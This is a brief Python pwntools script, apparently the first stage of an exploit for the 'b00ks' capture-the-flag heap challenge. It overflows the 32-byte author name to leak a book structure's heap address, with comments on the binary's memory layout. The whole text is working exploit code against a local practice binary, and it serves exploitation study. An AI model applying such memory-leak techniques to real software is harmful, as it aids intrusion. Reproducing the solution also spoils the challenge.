from pwn import *
context.log_level = 'debug'

p = process('./b00ks')

#.data:0000000000202010 off_202010      dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38o
#.data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: sub_B6D+15o
#202060 - 202040 = 0x20 means book array locates behind author, the start 0000 for book addr: 0x00005581d0f3e080 would be end of author
p.recvuntil('Enter author name:')

p.sendline('a'*32)


p.recvuntil('>')
p.sendline('1') #create book
p.recvuntil('Enter book name size:')
p.sendline('32')
p.recvuntil('Enter book name (Max 32 chars):')
p.sendline('object1')
p.recvuntil('Enter book description size:')
p.sendline('32')
p.recvuntil('Enter book description:')
p.sendline('object1')

p.recvuntil('>')# print book1
gdb.attach(p)
p.sendline('4')
p.recvuntil('Author:')
p.recvuntil('a'*32) # <== leak book1
book1_addr=p.recvn(6)
book1_addr=book1_addr.ljust(8,'\x00')
book1_addr=u64(book1_addr)
print 'book1_addr= ' + hex(book1_addr)